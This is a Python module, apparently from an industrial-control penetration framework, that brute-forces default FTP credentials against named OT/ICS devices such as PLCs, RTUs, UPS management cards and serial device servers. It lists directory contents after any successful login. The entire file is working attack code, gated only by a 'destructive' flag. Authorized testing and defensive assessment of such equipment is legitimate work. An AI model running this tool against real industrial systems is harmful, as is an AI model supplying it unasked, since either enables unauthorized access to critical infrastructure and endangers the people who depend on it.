"""Generic FTP Default Credentials bruteforce for OT/ICS devices."""

import logging
import ftplib
import socket

from industrialxpl.core.exploit import (
    Exploit as _Exploit,
    OptBool,
    OptIP,
    OptInteger,
    OptPort,
    OptWordlist,
    mute,
    print_error,
    print_info,
    print_status,
    print_success,
    print_warning,
    DestructiveGate,
)

from industrialxpl.modules.creds._wordlist_loader import load_credential_pairs

_DEFAULT_CREDS = load_credential_pairs("ftp_default_credentials.txt")


class Exploit(_Exploit):
    __info__ = {
        "name":         "Generic FTP Default Credentials",
        "description":  (
            "Tests common default FTP credentials against OT/ICS devices. "
            "Covers PLCs (Schneider Modicon, Siemens LOGO!, WAGO), serial "
            "device servers (Moxa, Lantronix), UPS (APC NMC), DCS clients "
            "(Yokogawa CENTUM), RTUs (Emerson ROC), and firmware download "
            "accounts. Also checks anonymous FTP access."
        ),
        "authors":      ("Andre Henrique (@mrhenrike) | Uniao Geek",),
        "references":   (
            "CISA ICS-CERT Alert TA17-156A",
            "Schneider Electric Security Notification SEVD-2017-075-01",
        ),
        "devices":      ("Any FTP-enabled OT device",),
        "impact":       "MEDIUM",
        "exploit_type": "Default Credentials",
        "source_poc":   "IXF native (ftplib)",
        "cve":          "N/A", "cvss": "N/A", "severity": "MEDIUM",
        "mitre_techniques": ["T0812", "T0859"],
        "mitre_tactics":    ["Initial Access", "Credential Access"],
    }

    target   = OptIP("", "Target FTP host")
    port     = OptPort(21, "FTP port")
    timeout  = OptInteger(5, "Connection timeout")
    simulate = OptBool(False, "Simulate mode")
    destructive = OptBool(False, "Enable credential bruteforce")

    @mute
    def check(self) -> bool:
        if not self.target:
            return False
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((self.target, self.port))
            banner = sock.recv(256)
            sock.close()
            return b"220" in banner or b"FTP" in banner.upper()
        except (ConnectionError, TimeoutError, OSError):
            return False

    def run(self) -> None:
        if not self.target:
            print_error("Set 'target' option first.")
            return

        creds = getattr(self, "_default_creds", _DEFAULT_CREDS)

        if self.simulate:
            DestructiveGate.print_simulation(
                description=(
                    f"Would test {len(creds)} credential pairs "
                    f"against FTP on {self.target}:{self.port}"
                ),
                mitre_techniques=["T0812"],
            )
            for user, pwd in creds:
                u = user if user else "(empty)"
                p = pwd if pwd else "(empty)"
                print_info(f"  [SIM] Would try {u}:{p}")
            return

        if not self.destructive:
            print_warning(
                "FTP credential bruteforce requires 'destructive=True'. "
                "Use 'simulate=True' to preview."
            )
            return

        print_status(
            f"Testing {len(creds)} FTP credential pairs "
            f"on {self.target}:{self.port}"
        )

        found: list[tuple[str, str]] = []
        for user, pwd in creds:
            u_display = user if user else "(empty)"
            p_display = pwd if pwd else "(empty)"
            try:
                ftp = ftplib.FTP()
                ftp.connect(self.target, self.port, timeout=self.timeout)
                ftp.login(user, pwd)
                print_success(f"  VALID: {u_display}:{p_display}")
                found.append((user, pwd))
                try:
                    listing = []
                    ftp.retrlines("LIST", listing.append)
                    if listing:
                        print_info(f"    Directory listing ({len(listing)} entries)")
                        for line in listing[:5]:
                            print_info(f"      {line}")
                except (KeyError, TypeError, ValueError) as e:
                    logging.debug("Data error (unexpected format): %s", e)
                ftp.quit()
            except ftplib.error_perm:
                print_info(f"  FAIL: {u_display}:{p_display}")
            except (TimeoutError, ConnectionRefusedError, OSError) as exc:
                print_warning(f"  Connection error: {exc}")
                break

        if found:
            print_success(
                f"\n[+] Found {len(found)} valid FTP credential(s) "
                f"on {self.target}:{self.port}"
            )
            for user, pwd in found:
                u = user if user else "(empty)"
                p = pwd if pwd else "(empty)"
                print_success(f"    {u}:{p}")
        else:
            print_status("No valid FTP credentials found.")


MANIFEST = {
    "name": "ftp_default",
    "category": "creds",
    "protocol": "FTP",
    "mitre_ics": ["T0812", "T0859"],
}
